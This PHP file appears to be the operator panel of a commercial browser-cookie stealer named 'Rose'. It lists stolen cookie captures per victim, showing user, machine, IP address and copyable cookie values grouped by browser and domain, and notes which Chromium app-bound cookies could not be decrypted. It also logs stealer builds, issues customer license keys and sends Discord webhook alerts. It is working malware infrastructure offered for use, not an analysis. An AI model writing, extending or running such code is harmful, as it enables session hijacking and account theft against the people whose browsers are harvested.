<?php
declare(strict_types=1);

require __DIR__ . '/lib/db.php';
require __DIR__ . '/lib/auth.php';
require __DIR__ . '/lib/layout.php';

require_login();

$page = (string)($_GET['p'] ?? 'captures');
if (!in_array($page, ['captures', 'capture', 'builds', 'licenses', 'settings'], true)) {
    $page = 'captures';
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    check_csrf();
    $action = (string)($_POST['action'] ?? '');

    if ($action === 'license_create') {
        $plan = trim((string)($_POST['plan'] ?? 'standard'));
        if ($plan === '') {
            $plan = 'standard';
        }
        $expires = trim((string)($_POST['expires'] ?? ''));
        if ($expires !== '' && !preg_match('/^\d{4}-\d{2}-\d{2}$/', $expires)) {
            flash_set('bad', 'expiry must look like 2027-01-31');
            header('Location: index.php?p=licenses');
            exit;
        }
        $key = new_license_key();
        $stmt = db()->prepare(
            'INSERT INTO licenses (lic_key, plan, expires, hwid, active, note, created)
             VALUES (?, ?, ?, NULL, 1, ?, ?)'
        );
        $stmt->execute([$key, substr($plan, 0, 32), $expires === '' ? null : $expires,
            substr(trim((string)($_POST['note'] ?? '')), 0, 160), now_iso()]);
        flash_set('ok', 'key created: ' . $key);
        header('Location: index.php?p=licenses');
        exit;
    }

    if ($action === 'license_toggle') {
        $id = (int)($_POST['id'] ?? 0);
        db()->prepare('UPDATE licenses SET active = 1 - active WHERE id = ?')->execute([$id]);
        flash_set('ok', 'key status flipped');
        header('Location: index.php?p=licenses');
        exit;
    }

    if ($action === 'license_unbind') {
        $id = (int)($_POST['id'] ?? 0);
        db()->prepare('UPDATE licenses SET hwid = NULL WHERE id = ?')->execute([$id]);
        flash_set('ok', 'device unbound - the next machine to use it takes it');
        header('Location: index.php?p=licenses');
        exit;
    }

    if ($action === 'license_delete') {
        $id = (int)($_POST['id'] ?? 0);
        db()->prepare('DELETE FROM licenses WHERE id = ?')->execute([$id]);
        flash_set('ok', 'key deleted');
        header('Location: index.php?p=licenses');
        exit;
    }

    if ($action === 'capture_delete') {
        $id = (int)($_POST['id'] ?? 0);
        db()->prepare('DELETE FROM captures WHERE id = ?')->execute([$id]);
        flash_set('ok', 'capture deleted');
        header('Location: index.php?p=captures');
        exit;
    }

    if ($action === 'settings_save') {
        $hook = trim((string)($_POST['webhook'] ?? ''));
        if ($hook !== '' && strpos($hook, 'https://') !== 0) {
            flash_set('bad', 'webhook must start with https://');
        } else {
            put_setting('webhook', $hook);
            flash_set('ok', 'settings saved');
        }
        header('Location: index.php?p=settings');
        exit;
    }

    if ($action === 'settings_test') {
        $hook = trim((string)($_POST['webhook'] ?? ''));
        if ($hook === '' ) {
            $hook = trim((string)(setting('webhook', (string)(panel_conf()['webhook'] ?? '')) ?? ''));
        }
        $result = test_webhook($hook);
        flash_set(strpos($result, 'delivered') === 0 ? 'ok' : 'bad', $result);
        header('Location: index.php?p=settings');
        exit;
    }
}

panel_head(page_title($page));
panel_nav($page === 'capture' ? 'captures' : $page);
render_flash();

if ($page === 'captures') {
    render_captures();
} elseif ($page === 'capture') {
    render_capture((int)($_GET['id'] ?? 0));
} elseif ($page === 'builds') {
    render_builds();
} elseif ($page === 'licenses') {
    render_licenses();
} else {
    render_settings();
}

panel_foot();

// ---------------------------------------------------------------------------

function page_title(string $page): string
{
    switch ($page) {
        case 'builds': return 'Builds';
        case 'licenses': return 'Licenses';
        case 'settings': return 'Settings';
        case 'capture': return 'Capture';
        default: return 'Captures';
    }
}

function fmt_time(?string $value): string
{
    if (!$value) {
        return '-';
    }
    $ts = strtotime($value);
    return $ts === false ? (string)$value : gmdate('Y-m-d H:i', $ts) . ' UTC';
}

function stat_card(string $label, string $value): void
{
    echo '<div class="stat"><div class="label">' . h($label) . '</div>';
    echo '<div class="value">' . h($value) . '</div></div>';
}

function render_captures(): void
{
    $pdo = db();
    $totals = $pdo->query('SELECT COUNT(*) AS n, COALESCE(SUM(cookies),0) AS c FROM captures')->fetch();
    $devices = (int)$pdo->query('SELECT COUNT(DISTINCT machine) FROM captures')->fetchColumn();
    $builds = (int)$pdo->query('SELECT COUNT(*) FROM builds')->fetchColumn();
    $last = $pdo->query('SELECT at FROM captures ORDER BY id DESC LIMIT 1')->fetchColumn();

    echo '<div class="head"><h1>Captures</h1><span class="sub">newest first</span></div>';
    echo '<div class="stats">';
    stat_card('captures', (string)(int)$totals['n']);
    stat_card('cookies', (string)(int)$totals['c']);
    stat_card('devices', (string)$devices);
    stat_card('builds', (string)$builds);
    echo '</div>';

    echo '<div class="card"><h2>Last seen: ' . h(fmt_time($last === false ? null : (string)$last)) . '</h2>';

    $rows = $pdo->query('SELECT id, tag, app, suser, machine, ip, cookies, at FROM captures ORDER BY id DESC LIMIT 300')->fetchAll();
    if (!$rows) {
        echo '<div class="empty">No captures yet. Build an executable in the Rose app and run it on a target machine.</div>';
        echo '</div>';
        return;
    }

    echo '<table><thead><tr><th>Received</th><th>User / machine</th><th>Address</th>';
    echo '<th>Cookies</th><th>Build</th><th></th></tr></thead><tbody>';

    foreach ($rows as $row) {
        echo '<tr>';
        echo '<td class="mono">' . h(fmt_time((string)$row['at'])) . '</td>';
        echo '<td>' . h((string)$row['suser']) . '<span style="color:#928a9c"> @ </span>' . h((string)$row['machine']) . '</td>';
        echo '<td class="mono">' . h((string)$row['ip']) . '</td>';
        echo '<td><span class="pill">' . (int)$row['cookies'] . '</span></td>';
        echo '<td class="mono">' . h((string)$row['tag']) . '</td>';
        echo '<td><a href="index.php?p=capture&id=' . (int)$row['id'] . '">open</a></td>';
        echo '</tr>';
    }

    echo '</tbody></table></div>';
}

function render_capture(int $id): void
{
    $stmt = db()->prepare('SELECT * FROM captures WHERE id = ?');
    $stmt->execute([$id]);
    $row = $stmt->fetch();

    if (!$row) {
        echo '<div class="empty">Capture not found.</div>';
        return;
    }

    $data = json_decode((string)$row['payload'], true);
    $cookies = is_array($data['cookies'] ?? null) ? $data['cookies'] : [];
    $skipped = (int)($data['skipped'] ?? 0);

    echo '<div class="head"><h1>Capture #' . (int)$row['id'] . '</h1>';
    echo '<span class="sub"><a href="index.php?p=captures">back to captures</a></span></div>';

    echo '<div class="card"><h2>Source</h2><div class="kv">';
    echo '<div class="k">received</div><div>' . h(fmt_time((string)$row['received'])) . '</div>';
    echo '<div class="k">collected</div><div>' . h(fmt_time((string)$row['at'])) . '</div>';
    echo '<div class="k">user</div><div>' . h((string)$row['suser']) . '</div>';
    echo '<div class="k">machine</div><div>' . h((string)$row['machine']) . '</div>';
    echo '<div class="k">address</div><div class="mono">' . h((string)$row['ip']) . '</div>';
    echo '<div class="k">build</div><div class="mono">' . h((string)$row['tag']) . '</div>';
    echo '<div class="k">application</div><div>' . h((string)$row['app']) . '</div>';
    echo '<div class="k">user agent</div><div class="mono" style="word-break:break-all">' . h((string)$row['agent']) . '</div>';
    echo '<div class="k">cookies</div><div>' . (int)$row['cookies'] . '</div>';
    if ($skipped > 0) {
        echo '<div class="k">skipped</div><div>' . $skipped . ' app-bound (v20)</div>';
    }
    echo '</div>';

    echo '<form method="post" action="index.php?p=capture&id=' . (int)$row['id'] . '" data-confirm="Delete this capture?" style="margin-top:14px">';
    echo csrf_field();
    echo '<input type="hidden" name="action" value="capture_delete">';
    echo '<input type="hidden" name="id" value="' . (int)$row['id'] . '">';
    echo '<button class="btn ghost small" type="submit">Delete capture</button></form>';
    echo '</div>';

    if (!$cookies) {
        $why = $skipped > 0
            ? 'Every cookie in this capture was app-bound (v20) - Chromium 127+ wraps those with a key only its own elevation service can open.'
            : 'This capture carried no cookies - the target had no browser store readable.';
        echo '<div class="card"><div class="empty">' . h($why) . '</div></div>';
        return;
    }

    $grouped = [];
    foreach ($cookies as $cookie) {
        $browser = (string)($cookie['browser'] ?? 'Unknown');
        $host = (string)($cookie['host'] ?? '');
        $grouped[$browser][$host][] = $cookie;
    }

    ksort($grouped);
    foreach ($grouped as $browser => $hosts) {
        $count = 0;
        foreach ($hosts as $items) {
            $count += count($items);
        }

        echo '<div class="card"><h2>' . h($browser) . ' &middot; ' . $count . ' cookies &middot; ';
        echo count($hosts) . ' domains</h2><div class="scroll"><table><thead><tr>';
        echo '<th>Domain</th><th>Name</th><th>Value</th><th>Expires</th></tr></thead><tbody>';

        ksort($hosts);
        foreach ($hosts as $host => $items) {
            foreach ($items as $cookie) {
                $value = (string)($cookie['value'] ?? '');
                $expires = (int)($cookie['expires'] ?? 0);
                echo '<tr>';
                echo '<td class="mono">' . h($host) . '</td>';
                echo '<td class="mono">' . h((string)($cookie['name'] ?? '')) . '</td>';
                echo '<td class="mono" style="word-break:break-all;max-width:520px">' . h($value);
                if ($value !== '') {
                    echo '<button class="copy" type="button" data-copy="' . h($value) . '">copy</button>';
                }
                echo '</td>';
                echo '<td class="mono">' . h($expires > 0 ? gmdate('Y-m-d', $expires) : 'session') . '</td>';
                echo '</tr>';
            }
        }

        echo '</tbody></table></div></div>';
    }
}

function render_builds(): void
{
    $rows = db()->query('SELECT * FROM builds ORDER BY id DESC LIMIT 300')->fetchAll();

    echo '<div class="head"><h1>Builds</h1><span class="sub">reported by the Rose app</span></div>';
    echo '<div class="card">';

    if (!$rows) {
        echo '<div class="empty">No builds logged yet. Each successful build posts its name, size and version here.</div>';
        echo '</div>';
        return;
    }

    echo '<table><thead><tr><th>When</th><th>File</th><th>Version</th><th>Size</th>';
    echo '<th>Device</th></tr></thead><tbody>';
    foreach ($rows as $row) {
        echo '<tr>';
        echo '<td class="mono">' . h(fmt_time((string)$row['at'])) . '</td>';
        echo '<td class="mono">' . h((string)$row['file']) . '</td>';
        echo '<td class="mono">' . h((string)$row['version']) . '</td>';
        echo '<td class="mono">' . number_format((int)$row['size']) . ' B</td>';
        echo '<td class="mono">' . h((string)$row['hwid']) . '</td>';
        echo '</tr>';
    }
    echo '</tbody></table></div>';
}

function render_licenses(): void
{
    echo '<div class="head"><h1>Licenses</h1><span class="sub">keys bind to the first device that presents them</span></div>';

    echo '<div class="card"><h2>Issue a key</h2>';
    echo '<form method="post" action="index.php?p=licenses">';
    echo csrf_field();
    echo '<input type="hidden" name="action" value="license_create">';
    echo '<div class="row">';
    echo '<div><label for="plan">Plan</label><input id="plan" name="plan" value="standard"></div>';
    echo '<div><label for="expires">Expires (optional)</label><input id="expires" name="expires" type="date"></div>';
    echo '<div><label for="note">Note</label><input id="note" name="note" placeholder="customer name"></div>';
    echo '</div>';
    echo '<div style="margin-top:16px"><button class="btn" type="submit">Generate key</button></div>';
    echo '</form></div>';

    $rows = db()->query('SELECT * FROM licenses ORDER BY id DESC LIMIT 300')->fetchAll();
    echo '<div class="card"><h2>Issued</h2>';

    if (!$rows) {
        echo '<div class="empty">No keys yet. Keys only gate the Rose app itself; collectors work without one.</div>';
        echo '</div>';
        return;
    }

    echo '<table><thead><tr><th>Key</th><th>Plan</th><th>Expires</th><th>Device</th>';
    echo '<th>Status</th><th></th></tr></thead><tbody>';

    foreach ($rows as $row) {
        $expired = !empty($row['expires']) && strtotime((string)$row['expires']) < strtotime('today');
        $active = (int)$row['active'] === 1 && !$expired;

        echo '<tr>';
        echo '<td class="mono">' . h((string)$row['lic_key']);
        echo '<button class="copy" type="button" data-copy="' . h((string)$row['lic_key']) . '">copy</button></td>';
        echo '<td>' . h((string)$row['plan']) . '</td>';
        echo '<td class="mono">' . h($row['expires'] ? (string)$row['expires'] : 'never') . '</td>';
        echo '<td class="mono">' . h($row['hwid'] ? (string)$row['hwid'] : 'unbound') . '</td>';
        echo '<td><span class="pill ' . ($active ? 'ok' : 'bad') . '">' . ($active ? 'active' : ($expired ? 'expired' : 'off')) . '</span></td>';
        echo '<td style="white-space:nowrap">';

        echo '<form method="post" action="index.php?p=licenses" style="display:inline">' . csrf_field();
        echo '<input type="hidden" name="action" value="license_toggle">';
        echo '<input type="hidden" name="id" value="' . (int)$row['id'] . '">';
        echo '<button class="btn ghost small" type="submit">' . ($active ? 'disable' : 'enable') . '</button></form> ';

        if (!empty($row['hwid'])) {
            echo '<form method="post" action="index.php?p=licenses" style="display:inline">' . csrf_field();
            echo '<input type="hidden" name="action" value="license_unbind">';
            echo '<input type="hidden" name="id" value="' . (int)$row['id'] . '">';
            echo '<button class="btn ghost small" type="submit">unbind</button></form> ';
        }

        echo '<form method="post" action="index.php?p=licenses" style="display:inline" data-confirm="Delete this key?">' . csrf_field();
        echo '<input type="hidden" name="action" value="license_delete">';
        echo '<input type="hidden" name="id" value="' . (int)$row['id'] . '">';
        echo '<button class="btn ghost small" type="submit">delete</button></form>';

        echo '</td></tr>';
    }

    echo '</tbody></table></div>';
}

function render_settings(): void
{
    $conf = panel_conf();
    $hook = (string)(setting('webhook', $conf['webhook'] ?? '') ?? '');
    $root = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http')
        . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost')
        . rtrim(dirname((string)$_SERVER['SCRIPT_NAME']), '/');

    echo '<div class="head"><h1>Settings</h1><span class="sub">panel wiring</span></div>';

    echo '<div class="card"><h2>Panel URL</h2>';
    echo '<div class="kv">';
    echo '<div class="k">base URL</div><div class="mono">' . h($root) . '</div>';
    echo '<div class="k">license endpoint</div><div class="mono">' . h($root) . '/api/license.php</div>';
    echo '<div class="k">collector endpoint</div><div class="mono">' . h($root) . '/api/collect.php</div>';
    echo '<div class="k">database</div><div class="mono">' . h((string)$conf['db']) . '</div>';
    echo '</div>';
    echo '<div class="empty" style="padding-bottom:0">Paste the base URL into the Rose app under Account.</div>';
    echo '</div>';

    echo '<div class="card"><h2>Notifications</h2>';
    echo '<form method="post" action="index.php?p=settings">';
    echo csrf_field();
    echo '<input type="hidden" name="action" value="settings_save">';
    echo '<label for="webhook">Discord webhook</label>';
    echo '<input id="webhook" name="webhook" value="' . h($hook) . '" placeholder="https://discord.com/api/webhooks/...">';
    echo '<div style="margin-top:16px"><button class="btn" type="submit">Save Settings</button></div>';
    echo '</form>';

    echo '<form method="post" action="index.php?p=settings" style="margin-top:10px">';
    echo csrf_field();
    echo '<input type="hidden" name="action" value="settings_test">';
    echo '<input type="hidden" name="webhook" value="' . h($hook) . '">';
    echo '<button class="btn ghost" type="submit">Send test message</button>';
    echo '</form></div>';

    $totals = db()->query('SELECT COUNT(*) FROM captures')->fetchColumn();
    echo '<div class="card"><h2>Maintenance</h2>';
    echo '<div class="kv"><div class="k">captures stored</div><div>' . (int)$totals . '</div>';
    echo '<div class="k">php</div><div class="mono">' . h(PHP_VERSION) . '</div>';
    echo '<div class="k">curl</div><div>' . (function_exists('curl_init') ? 'available' : 'not installed (stream fallback)') . '</div>';
    echo '</div></div>';
}

function test_webhook(string $hook): string
{
    if ($hook === '' || strpos($hook, 'https://') !== 0) {
        return 'enter an https webhook first';
    }

    $body = json_encode([
        'username' => 'Rose',
        'allowed_mentions' => ['parse' => []],
        'content' => 'panel test ok - webhook is wired',
    ], JSON_UNESCAPED_SLASHES);

    if (function_exists('curl_init')) {
        $ch = curl_init($hook);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 8,
            CURLOPT_CONNECTTIMEOUT => 5,
        ]);
        $response = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        if ($response === false) {
            return 'failed: ' . $error;
        }
        return ($code >= 200 && $code < 300) ? 'delivered (' . $code . ')' : 'failed: http ' . $code;
    }

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 8,
            'ignore_errors' => true,
        ],
    ]);
    $response = @file_get_contents($hook, false, $context);
    if ($response === false) {
        return 'failed: stream request rejected';
    }
    $status = isset($http_response_header[0]) ? $http_response_header[0] : '';
    return preg_match('/\s2\d\d\s/', $status) ? 'delivered' : 'failed: ' . trim($status);
}
